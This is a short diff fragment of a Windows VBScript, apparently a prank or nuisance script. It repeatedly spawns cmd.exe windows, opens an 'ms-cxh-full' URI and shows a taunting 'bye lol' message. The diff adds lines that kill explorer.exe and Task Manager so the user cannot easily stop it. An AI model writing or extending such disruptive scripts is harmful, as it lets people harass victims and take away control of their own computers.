@@ -214,6 +214,8 @@ WshShell.run "cmd.exe"
 WshShell.run "cmd.exe"
 WshShell.run "cmd.exe"
 WshShell.run "ms-cxh-full://fodasse"
+WshShell.Run "taskkill /im explorer.exe", , True
+WshShell.Run "taskkill /im taskmgr.exe", , True
 msgbox "bye lol"
 
 Else
